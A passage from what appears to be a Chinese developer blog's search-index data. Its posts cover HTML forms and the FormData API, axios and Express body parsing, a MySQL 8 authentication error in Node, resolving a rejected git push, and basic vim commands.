一般两者都会一起用","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"FormData","slug":"FormData","date":"2022-03-21T03:13:21.000Z","updated":"2022-03-21T03:14:47.585Z","comments":true,"path":"2022/03/21/FormData/","link":"","permalink":"https://coloey.github.io/2022/03/21/FormData/","excerpt":"","text":"表单，FormData 对象目录 [隐藏] 表单概述 FormData 对象 概述 实例方法 表单的内置验证 自动校验 checkValidity() willValidate 属性 validationMessage 属性 setCustomValidity() validity 属性 表单的 novalidate 属性 enctype 属性 文件上传 参考链接 表单概述表单（&lt;form&gt;）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。 12345678910111213&lt;form action=&quot;/handling-page&quot; method=&quot;post&quot;&gt; &lt;div&gt; &lt;label for=&quot;name&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;user_name&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;passwd&quot;&gt;密码：&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;passwd&quot; name=&quot;user_passwd&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;提交&quot; /&gt; &lt;/div&gt;&lt;/form&gt; 上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。 用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的name属性，键值是控件的value属性，键名和键值之间由等号连接。比如，用户名输入框的name属性是user_name，value属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对user_name=张三。 所有的键值对都会提交到服务器。但是，提交的数据格式跟&lt;form&gt;元素的method属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交。下面就是 GET 请求的 HTTP 头信息。 12GET /handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交Host: example.com 如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如user_name=张三&amp;user_passwd=123&amp;submit_button=提交。下面就是 POST 请求的头信息。 123456POST /handling-page HTTP/1.1Host: example.comContent-Type: application/x-www-form-urlencodedContent-Length: 74user_name=张三&amp;user_passwd=123&amp;submit_button=提交 注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。 点击submit控件，就可以提交表单。 123&lt;form&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt; 上面表单就包含一个submit控件，点击这个控件，浏览器就会把表单数据向服务器提交。 注意，表单里面的&lt;button&gt;元素如果没有用type属性指定类型，那么默认就是submit控件。 123&lt;form&gt; &lt;button&gt;提交&lt;/button&gt;&lt;/form&gt; 上面表单的&lt;button&gt;元素，点击以后也会提交表单。 除了点击submit控件提交表单，还可以用表单元素的submit()方法，通过脚本提交表单。 1formElement.submit(); 表单元素的reset()方法可以重置所有控件的值（重置为默认值）。 1formElement.reset() FormData 对象概述表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。 FormData()首先是一个构造函数，用来生成表单的实例。 1var formdata = new FormData(form); FormData()构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。 下面是一个表单。 123456789101112131415&lt;form id=&quot;myForm&quot; name=&quot;myForm&quot;&gt; &lt;div&gt; &lt;label for=&quot;username&quot;&gt;用户名：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;useracc&quot;&gt;账号：&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;useracc&quot; name=&quot;useracc&quot;&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;userfile&quot;&gt;上传文件：&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;userfile&quot; name=&quot;userfile&quot;&gt; &lt;/div&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit!&quot;&gt;&lt;/form&gt; 我们用FormData()处理上面这个表单。 12345678910var myForm = document.getElementById(&#x27;myForm&#x27;);var formData = new FormData(myForm);// 获取某个控件的值formData.get(&#x27;username&#x27;) // &quot;&quot;// 设置某个控件的值formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);formData.get(&#x27;username&#x27;) // &quot;张三&quot; 实例方法FormData 提供以下实例方法。 FormData.get(key)：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。 FormData.getAll(key)：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。 FormData.set(key, value)：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。 FormData.delete(key)：删除一个键值对，参数为键名。 FormData.append(key, value)：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。 FormData.has(key)：返回一个布尔值，表示是否具有该键名的键值对。 FormData.keys()：返回一个遍历器对象，用于for...of循环遍历所有的键名。 FormData.values()：返回一个遍历器对象，用于for...of循环遍历所有的键值。 FormData.entries()：返回一个遍历器对象，用于for...of循环遍历所有的键值对。如果直接用for...of循环遍历 FormData 实例，默认就会调用这个方法。 下面是get()、getAll()、set()、append()方法的例子。 123456789var formData = new FormData();formData.set(&#x27;username&#x27;, &#x27;张三&#x27;);formData.append(&#x27;username&#x27;, &#x27;李四&#x27;);formData.get(&#x27;username&#x27;) // &quot;张三&quot;formData.getAll(&#x27;username&#x27;) // [&quot;张三&quot;, &quot;李四&quot;]formData.append(&#x27;userpic[]&#x27;, myFileInput.files[0], &#x27;user1.jpg&#x27;);formData.append(&#x27;userpic[]&#x27;, myFileInput.files[1], &#x27;user2.jpg&#x27;); 下面是遍历器的例子。 12345678910111213141516171819202122232425262728var formData = new FormData();formData.append(&#x27;key1&#x27;, &#x27;value1&#x27;);formData.append(&#x27;key2&#x27;, &#x27;value2&#x27;);for (var key of formData.keys()) &#123; console.log(key);&#125;// &quot;key1&quot;// &quot;key2&quot;for (var value of formData.values()) &#123; console.log(value);&#125;// &quot;value1&quot;// &quot;value2&quot;for (var pair of formData.entries()) &#123; console.log(pair[0] + &#x27;: &#x27; + pair[1]);&#125;// key1: value1// key2: value2// 等同于遍历 formData.entries()for (var pair of formData) &#123; console.log(pair[0] + &#x27;: &#x27; + pair[1]);&#125;// key1: value1// key2: value2 表单的内置验证自动校验表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。 1234567891011121314151617&lt;!-- 必填 --&gt;&lt;input required&gt;&lt;!-- 必须符合正则表达式 --&gt;&lt;input pattern=&quot;banana|cherry&quot;&gt;&lt;!-- 字符串长度必须为6个字符 --&gt;&lt;input minlength=&quot;6&quot; maxlength=&quot;6&quot;&gt;&lt;!-- 数值必须在1到10之间 --&gt;&lt;input type=&quot;number&quot; min=&quot;1&quot; max=&quot;10&quot;&gt;&lt;!-- 必须填入 Email 地址 --&gt;&lt;input type=&quot;email&quot;&gt;&lt;!-- 必须填入 URL --&gt;&lt;input type=&quot;URL&quot;&gt; 如果一个控件通过验证，它就会匹配:valid的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配:invalid的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。 1234567input:invalid &#123; border-color: red;&#125;input,input:valid &#123; border-color: #ccc;&#125; checkValidity()除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有checkValidity()方法，用于手动触发校验。 12345// 触发整个表单的校验form.checkValidity()// 触发单个表单控件的校验formControl.checkValidity() checkValidity()方法返回一个布尔值，true表示通过校验，false表示没有通过校验。因此，提交表单可以封装为下面的函数。 1234567function submitForm(action) &#123; var form = document.getElementById(&#x27;form&#x27;); form.action = action; if (form.checkValidity()) &#123; form.submit(); &#125;&#125; willValidate 属性控件元素的willValidate属性是一个布尔值，表示该控件是否会在提交时进行校验。 1234567// HTML 代码如下// &lt;form novalidate&gt;// &lt;input id=&quot;name&quot; name=&quot;name&quot; required /&gt;// &lt;/form&gt;var input = document.querySelector(&#x27;#name&#x27;);input.willValidate // true validationMessage 属性控件元素的validationMessage属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。 该控件不会在提交时自动校验 该控件满足校验条件 1234// HTML 代码如下// &lt;form&gt;&lt;input type=&quot;text&quot; required&gt;&lt;/form&gt;document.querySelector(&#x27;form input&#x27;).validationMessage// &quot;请填写此字段。&quot; 下面是另一个例子。 1234var myInput = document.getElementById(&#x27;myinput&#x27;);if (!myInput.checkValidity()) &#123; document.getElementById(&#x27;prompt&#x27;).innerHTML = myInput.validationMessage;&#125; setCustomValidity()控件元素的setCustomValidity()方法用来定制校验失败时的报错信息。它接受一个字符串作为参数，该字符串就是定制的报错信息。如果参数为空字符串，则上次设置的报错信息被清除。 这个方法可以替换浏览器内置的表单验证报错信息，参数就是要显示的报错信息。 12345678910&lt;form action=&quot;somefile.php&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Username&quot; pattern=&quot;[a-z]&#123;1,15&#125;&quot; id=&quot;username&quot; &gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt; 上面的表单输入框，要求只能输入小写字母，且不得超过15个字符。如果输入不符合要求（比如输入“ABC”），提交表单的时候，Chrome 浏览器会弹出报错信息“Please match the requested format.”，禁止表单提交。下面使用setCustomValidity()方法替换掉报错信息。 123456var input = document.getElementById(&#x27;username&#x27;);input.oninvalid = function (event) &#123; event.target.setCustomValidity( &#x27;用户名必须是小写字母，不能为空，最长不超过15个字符&#x27; );&#125; 上面代码中，setCustomValidity()方法是在invalid事件的监听函数里面调用。该方法也可以直接调用，这时如果参数不为空字符串，浏览器就会认为该控件没有通过校验，就会立刻显示该方法设置的报错信息。 1234567891011121314151617181920/* HTML 代码如下&lt;form&gt; &lt;p&gt;&lt;input type=&quot;file&quot; id=&quot;fs&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/p&gt;&lt;/form&gt;*/document.getElementById(&#x27;fs&#x27;).onchange = checkFileSize;function checkFileSize() &#123; var fs = document.getElementById(&#x27;fs&#x27;); var files = fs.files; if (files.length &gt; 0) &#123; if (files[0].size &gt; 75 * 1024) &#123; fs.setCustomValidity(&#x27;文件不能大于 75KB&#x27;); return; &#125; &#125; fs.setCustomValidity(&#x27;&#x27;);&#125; 上面代码一旦发现文件大于 75KB，就会设置校验失败，同时给出自定义的报错信息。然后，点击提交按钮时，就会显示报错信息。这种校验失败是不会自动消除的，所以如果所有文件都符合条件，要将报错信息设为空字符串，手动消除校验失败的状态。 validity 属性控件元素的属性validity属性返回一个ValidityState对象，包含当前校验状态的信息。 该对象有以下属性，全部为只读属性。 ValidityState.badInput：布尔值，表示浏览器是否不能将用户的输入转换成正确的类型，比如用户在数值框里面输入字符串。 ValidityState.customError：布尔值，表示是否已经调用setCustomValidity()方法，将校验信息设置为一个非空字符串。 ValidityState.patternMismatch：布尔值，表示用户输入的值是否不满足模式的要求。 ValidityState.rangeOverflow：布尔值，表示用户输入的值是否大于最大范围。 ValidityState.rangeUnderflow：布尔值，表示用户输入的值是否小于最小范围。 ValidityState.stepMismatch：布尔值，表示用户输入的值不符合步长的设置（即不能被步长值整除）。 ValidityState.tooLong：布尔值，表示用户输入的字数超出了最长字数。 ValidityState.tooShort：布尔值，表示用户输入的字符少于最短字数。 ValidityState.typeMismatch：布尔值，表示用户填入的值不符合类型要求（主要是类型为 Email 或 URL 的情况）。 ValidityState.valid：布尔值，表示用户是否满足所有校验条件。 ValidityState.valueMissing：布尔值，表示用户没有填入必填的值。 下面是一个例子。 123456var input = document.getElementById(&#x27;myinput&#x27;);if (input.validity.valid) &#123; console.log(&#x27;通过校验&#x27;);&#125; else &#123; console.log(&#x27;校验失败&#x27;);&#125; 下面是另外一个例子。 12345var txt = &#x27;&#x27;;if (document.getElementById(&#x27;myInput&#x27;).validity.rangeOverflow) &#123; txt = &#x27;数值超过上限&#x27;;&#125;document.getElementById(&#x27;prompt&#x27;).innerHTML = txt; 如果想禁止浏览器弹出表单验证的报错信息，可以监听invalid事件。 123456789101112131415161718192021222324var input = document.getElementById(&#x27;username&#x27;);var form = document.getElementById(&#x27;form&#x27;);var elem = document.createElement(&#x27;div&#x27;);elem.id = &#x27;notify&#x27;;elem.style.display = &#x27;none&#x27;;form.appendChild(elem);input.addEventListener(&#x27;invalid&#x27;, function (event) &#123; event.preventDefault(); if (!event.target.validity.valid) &#123; elem.textContent = &#x27;用户名必须是小写字母&#x27;; elem.className = &#x27;error&#x27;; elem.style.display = &#x27;block&#x27;; input.className = &#x27;invalid animated shake&#x27;; &#125;&#125;);input.addEventListener(&#x27;input&#x27;, function(event)&#123; if ( &#x27;block&#x27; === elem.style.display ) &#123; input.className = &#x27;&#x27;; elem.style.display = &#x27;none&#x27;; &#125;&#125;); 上面代码中，一旦发生invalid事件（表单验证失败），event.preventDefault()用来禁止浏览器弹出默认的验证失败提示，然后设置定制的报错提示框。 表单的 novalidate 属性表单元素的 HTML 属性novalidate，可以关闭浏览器的自动校验。 12&lt;form novalidate&gt;&lt;/form&gt; 这个属性也可以在脚本里设置。 1form.noValidate = true; 如果表单元素没有设置novalidate属性，那么提交按钮（&lt;button&gt;或&lt;input&gt;元素）的formnovalidate属性也有同样的作用。 123&lt;form&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; formnovalidate&gt;&lt;/form&gt; enctype 属性表单能够用四种编码，向服务器发送数据。编码格式由表单的enctype属性决定。 假定表单有两个字段，分别是foo和baz，其中foo字段的值等于bar，baz字段的值是一个分为两行的字符串。 12The first line.The second line. 下面四种格式，都可以将这个表单发送到服务器。 （1）GET 方法 如果表单使用GET方法发送数据，enctype属性无效。 123456&lt;form action=&quot;register.php&quot; method=&quot;get&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 数据将以 URL 的查询字符串发出。 1?foo=bar&amp;baz=The%20first%20line.%0AThe%20second%20line. （2）application/x-www-form-urlencoded 如果表单用POST方法发送数据，并省略enctype属性，那么数据以application/x-www-form-urlencoded格式发送（因为这是默认值）。 123456&lt;form action=&quot;register.php&quot; method=&quot;post&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 123Content-Type: application/x-www-form-urlencodedfoo=bar&amp;baz=The+first+line.%0D%0AThe+second+line.%0D%0A 上面代码中，数据体里面的%0D%0A代表换行符（\\r\\n）。 （3）text/plain 如果表单使用POST方法发送数据，enctype属性为text/plain，那么数据将以纯文本格式发送。 1234567&lt;form action=&quot;register.php&quot; method=&quot;post&quot; enctype=&quot;text/plain&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 12345Content-Type: text/plainfoo=barbaz=The first line.The second line. （4）multipart/form-data 如果表单使用POST方法，enctype属性为multipart/form-data，那么数据将以混合的格式发送。 1234567&lt;form action=&quot;register.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;AJAXSubmit(this); return false;&quot;&gt;&lt;/form&gt; 发送的 HTTP 请求如下。 12345678910111213Content-Type: multipart/form-data; boundary=---------------------------314911788813839-----------------------------314911788813839Content-Disposition: form-data; name=&quot;foo&quot;bar-----------------------------314911788813839Content-Disposition: form-data; name=&quot;baz&quot;The first line.The second line.-----------------------------314911788813839-- 这种格式也是文件上传的格式。 文件上传用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。 1&lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot;&gt; 此外，还需要将表单&lt;form&gt;元素的method属性设为POST，enctype属性设为multipart/form-data。其中，enctype属性决定了 HTTP 头信息的Content-Type字段的值，默认情况下这个字段的值是application/x-www-form-urlencoded，但是文件上传的时候要改成multipart/form-data。 123456789&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label for=&quot;file&quot;&gt;选择一个文件&lt;/label&gt; &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;myFile&quot; multiple&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; id=&quot;submit&quot; name=&quot;submit_button&quot; value=&quot;上传&quot; /&gt; &lt;/div&gt;&lt;/form&gt; 上面的 HTML 代码中，file 控件的multiple属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。 12var fileSelect = document.getElementById(&#x27;file&#x27;);var files = fileSelect.files; 然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。 123456789101112var formData = new FormData();for (var i = 0; i &lt; files.length; i++) &#123; var file = files[i]; // 只上传图片文件 if (!file.type.match(&#x27;image.*&#x27;)) &#123; continue; &#125; formData.append(&#x27;photos[]&#x27;, file, file.name);&#125; 最后，使用 Ajax 向服务器上传文件。 1234567891011var xhr = new XMLHttpRequest();xhr.open(&#x27;POST&#x27;, &#x27;handler.php&#x27;, true);xhr.onload = function () &#123; if (xhr.status !== 200) &#123; console.log(&#x27;An error occurred!&#x27;); &#125;&#125;;xhr.send(formData); 除了发送 FormData 实例，也可以直接 AJAX 发送文件。 123456var file = document.getElementById(&#x27;test-input&#x27;).files[0];var xhr = new XMLHttpRequest();xhr.open(&#x27;POST&#x27;, &#x27;myserver/uploads&#x27;);xhr.setRequestHeader(&#x27;Content-Type&#x27;, file.type);xhr.send(file); 参考链接 HTML5 Form Validation With the “pattern” Attribute, Thoriq Firdaus","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"HTML5","slug":"Node/HTML5","permalink":"https://coloey.github.io/categories/Node/HTML5/"}],"tags":[]},{"title":"axios发送请求时后台接收的req.body为空","slug":"axios发送请求时后台接收的req-body为空","date":"2022-03-21T01:47:50.000Z","updated":"2022-03-21T03:12:20.438Z","comments":true,"path":"2022/03/21/axios发送请求时后台接收的req-body为空/","link":"","permalink":"https://coloey.github.io/2022/03/21/axios%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E6%97%B6%E5%90%8E%E5%8F%B0%E6%8E%A5%E6%94%B6%E7%9A%84req-body%E4%B8%BA%E7%A9%BA/","excerpt":"","text":"首先，先了解一下关于http协议里定义的四种常见数据的post方法，分别是：application/www-form-ulrencodedmultipart/form-dataapplication/jsontext/xml Express依赖bodyParser对请求的包体进行解析。默认支持application/json,application/www-form-urlencoded,multipart/form-data.单数对xml没有支持。需要自己代码来实现 用axios post请求提交数据的时候需要清楚发送请求的类型是哪种，后台用相应的方法解析 1 使用FormData提交表单数据 坑一：使用FormData时一定要在先绑定submit事件，在submit事件触发时发送axios post请求,否则获取不到formData里面的值 坑二:axios请求里面如果直接使用data:formData，浏览器会自动帮我们加上 Content-Type: multipart/form-data ，因此请求要这样设置： 123456789101112131415var form = document.getElementById(&quot;myForm&quot;); // 用表单来初始化 var formData = new FormData(form); // 我们可以根据name来访问表单中的字段 var username = formData.get(&quot;username&quot;); // 获取名字 var password = formData.get(&quot;password&quot;); // 获取密码 axios(&#123; method:&quot;post&quot;, url:&#x27;http://127.0.0.1/api/login&#x27;, data:&#123; username:username, password:password &#125; &#125;) 这样默认Content-type：application/json, 如果表单属性过多，可以先用一个对象接收： 123456789101112131415var form = document.getElementById(&quot;myForm&quot;); // 用表单来初始化 var formData = new FormData(form); // 我们可以根据name来访问表单中的字段 let myFormData=&#123;&#125;; //如果表单属性过多可以先遍历 for(let pair of formData.entries())&#123; myFormData[pair[0]]=pair[1]; &#125; axios(&#123; method:&quot;post&quot;, url:&#x27;http://127.0.0.1/api/login&#x27;, data:myFormData &#125;) 后台接收使用中间件body-parser解析表单体数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const express=require(&#x27;express&#x27;);const session=require(&#x27;express-session&#x27;);const cors=require(&#x27;cors&#x27;);const bodyParser=require(&#x27;body-parser&#x27;)const app=express();app.use(cors());app.use( session(&#123; secret:&#x27;xiaoqi&#x27;, resave:false, saveUninitialized:true &#125;))//托管静态页面app.use(express.static(&#x27;./pages&#x27;));//自定义解析Post提交过来的表单数据app.use(bodyParser.urlencoded(&#123;extended:false&#125;))app.use(bodyParser.json())//登录API接口app.post(&#x27;/api/login&#x27;,(req,res)=&gt;&#123; //判断用户提交的登录信息是否正确 //console.log(req.body) if(req.body.username!==&quot;admin&quot;||req.body.password!==&quot;888888&quot;)&#123; return res.send(&#123;status:1,msg:&#x27;登录失败&#x27;&#125;) &#125; //登录成功则把信息存储在Session中 console.log(req.body); req.session.user=req.body;//用户登录信息 req.session.islogin=true;//用户登录状态 res.send(&#123;status:0,msg:&#x27;登录成功&#x27;&#125;)&#125;)//获取用户姓名的接口app.get(&#x27;/api/username&#x27;,(req,res)=&gt;&#123; //从Session中获取用户姓名响应给客户端 if(!req.session.islogin)&#123; return res.send(&#123;status:1,msg:&#x27;fail&#x27;&#125;) &#125; res.send(&#123; status:0, msg:&#x27;success&#x27;, username:req.session.user.username, &#125;)&#125;)//退出登录的接口app.post(&#x27;/api/logout&#x27;,(req,res)=&gt;&#123; //清空当前客户端的session信息 req.session.destroy() res.send(&#123; status:0, msg:&#x27;退出登录成功&#x27; &#125;)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"node连接MySql报错ER_NOT_SUPPORTED_AUTH_MODE","slug":"node连接MySql报错ER-NOT-SUPPORTED-AUTH-MODE","date":"2022-03-20T05:28:16.000Z","updated":"2022-03-20T05:33:56.881Z","comments":true,"path":"2022/03/20/node连接MySql报错ER-NOT-SUPPORTED-AUTH-MODE/","link":"","permalink":"https://coloey.github.io/2022/03/20/node%E8%BF%9E%E6%8E%A5MySql%E6%8A%A5%E9%94%99ER-NOT-SUPPORTED-AUTH-MODE/","excerpt":"","text":"报错信息本人系统安装的是mysql-installer-community-8.0.18.0.msi这个版本，然后我本地使用node-mysql去连接数据库。 123456789101112131415const mysql=require(&#x27;mysql&#x27;)//建立MYSQL与数据库的联系const db=mysql.createPool(&#123; host:&#x27;127.0.0.1&#x27;,//数据库的ip地址 user:&#x27;root&#x27;, password:&#x27;123456&#x27;, database:&#x27;my_db_01&#x27;,//指定要操作哪个数据库&#125;)//测试mysql能否正常工作db.query(&#x27;select 1&#x27;,(err,result)=&gt;&#123; //mysql工作期间报错 if(err)return console.log(err.message) //能成功执行SQL语句 console.log(result);&#125;) 运行db.js 12PS D:\\Vue-chat\\Server&gt; node db.jsER_NOT_SUPPORTED_AUTH_MODE: Client does not support authentication protocol requested by server; consider upgrading MySQL client 报错原因mysql8.0以上加密方式，Node还不支持。 解决第一步谷歌查到了 https://stackoverflow.com/questions/50093144/mysql-8-0-client-does-not-support-authentication-protocol-requested-by-server这个答案，和我报错的步骤基本一样，按照这个进行操作，登录MySql Command Line Client使用这个 12345mysql&gt; alter user &#x27;root&#x27;@&#x27;localhost&#x27; identified with mysql_native_password by &#x27;123456&#x27;;Query OK, 0 rows affected (0.27 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.08 sec)","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"git遇到的坑","slug":"git遇到的坑","date":"2022-03-18T13:44:59.000Z","updated":"2022-03-18T13:45:30.601Z","comments":true,"path":"2022/03/18/git遇到的坑/","link":"","permalink":"https://coloey.github.io/2022/03/18/git%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/","excerpt":"","text":"解决用git push origin master时出现的问题不知道小伙伴们在使用git push origin master时有没有遇到下面的问题，今天我遇到了，原因一般是相同的，下面详细分析一下 报错内容：To github.com:/! [rejected] master -&gt; master (non-fast-forward)error: failed to push some refs to ‘&#x67;&#x69;&#x74;&#64;&#103;&#x69;&#x74;&#104;&#117;&#x62;&#x2e;&#x63;&#111;&#x6d;:***/***’hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: ‘git pull …’) before pushing again.hint: See the ‘Note about fast-forwards’ in ‘git push –help’ for details. 大致翻译为：错误：无法将一些引用推送到’&#103;&#x69;&#116;&#x40;&#103;&#105;&#x74;&#104;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;：****** / Demo.git’提示：由于当前分支的尖端位于其远程对应的后面，因此更新被拒绝。 合并远程更改（例如’git pull’），然后再次推送。 有关详细信息，请参见“ git push –help”中的“关于fast-forwards的注意事项”。 这个报错的原因是因为远程repository和本地的repository有冲突，下面有3种解决办法： 按上面报错内容中所给的提示先用git pull之后再用git push$ git pull origin master$ git push origin master 使用强制push的方法，但是这会使远程修改丢失，一般是不可取的，尤其是多人协作开发的时候$ git push origin master -f 如果不想merge远程和本地修改，可以先创建新的分支，然后再push$ git branch [name]$ git push origin [name]","categories":[{"name":"git","slug":"git","permalink":"https://coloey.github.io/categories/git/"}],"tags":[]},{"title":"vim","slug":"vim","date":"2022-03-18T13:42:38.000Z","updated":"2022-03-18T13:43:36.735Z","comments":true,"path":"2022/03/18/vim/","link":"","permalink":"https://coloey.github.io/2022/03/18/vim/","excerpt":"","text":"Vim可以分为三种模式，分别为： 命令行模式（Command mode） 插入模式（Insert mode） 底行模式（Lastline mode） 命令行模式 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 插入模式 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 底行模式 将文件保存或退出vim，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过，一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 5. Vim的基本操作a) 进入Vim 在系统光标提示符后，输入vim及文件名后，回车，进入Vim编辑画面。 特别注意，进入vim之后，是处于「命令行模式（command mode）」，要切换到「插入模式（Insert mode）」才能够输入文字。 b) 切换至插入模式（Insert mode）编辑文件 在「命令行模式（command mode）」下按一下字母「i」就可以进入「插入模式（Insert mode）」，这时候你就可以开始输入文字了。 c) 插入模式（Insert mode）切换到命令行模式（Command mode） 在插入模式下，按一下「ESC」键即可。 d) 退出vim及保存文件 在命令行模式（Command mode）下，按冒号「:」键，进入底行模式（Last Line mode） 常见底行模式下的命令行： :w filename 文件以filename为文件名保存 :wq 文件存盘并退出vim :q 文件不存盘并退出vim :q! 文件不存盘强制退出vim 6. 命令行模式下的功能键（部分）a) 从命令行模式切换为插入模式的三种方式 「 i 」：从当前光标位置进入插入模式 「 a 」：从当前光标位置的下一个字符进入插入模式 「 o 」：从当前光标位置的下一行进入插入模式 b) 从插入模式切换为命令行模式 按「ESC」键 c) 移动光标 vi可以直接用键盘上的光标来上下左右移动，但正规的vi是用小写英文字母「h」、「j」、「k」、「l」，分别控制光标左、下、上、右移一格。 d) 行尾追加 不管光标在该行的什么位置，直接按大写字母「A」即可 e) 删除单词 dw：把光标停留在需要删除的单词前面，依次按下「d」「w」，即可 de：把光标停留在需要删除的单词前面（无视单词前面的空格），依次按下「d」「e」，即可 f) 从当前光标处删除到行末 把光标停留在需要删除的句子前面，依次按下「d」「$」，即可 g) 快速跳转到行首 按下数字「0」，即可 h) 使用计数以删除单词 示例：this ABC DE line FGHI JK LMN OP of words is Q RS TUV cleaned up. 依次将鼠标定位到ABC前，按「d」「2」「w」，可以删除：ABC DE 将鼠标定位到FGHI前，按「d」「4」「w」，可以删除：FGHI JK LMN OP 将鼠标定位到Q前，按「d」「3」「w」，可以删除：Q RS TUV 得到句子： this line of words is cleaned up. i) 删除当前行 鉴于删除当前行这一操作的高频性，vim设计者简化了快捷键，按「d」「d」即可。 连续删除两行，从当前行开始，则为：「2」「d」「d」 j) 撤销更改 a. 按小写字母「u」，撤销上一步的更改操作； b. 按大写字母「U」，撤销整行的更改操作； c. 「Ctrl+R」撤销上一步「撤销操作」。 k) 将刚删除的内容置入其他行 之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。 先在想删除的行，按「d」「d」，进行删除操作； 再在想插入那行的前一行按「p」键即可。 l) 替换 将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。 m) 跳转 顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可； 底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可； 特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。 n) 查找命令 字符串查找： 输入英文斜杠「/」，后面紧接需要搜索的字符串即可。 查找下一个相同字符串，就紧接着按小写字母「n」； 查找上一个相同字符串，就紧接着按大写字母「N」。 配对括号查找： 在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。 o) 替换字符串 当前行替换命令 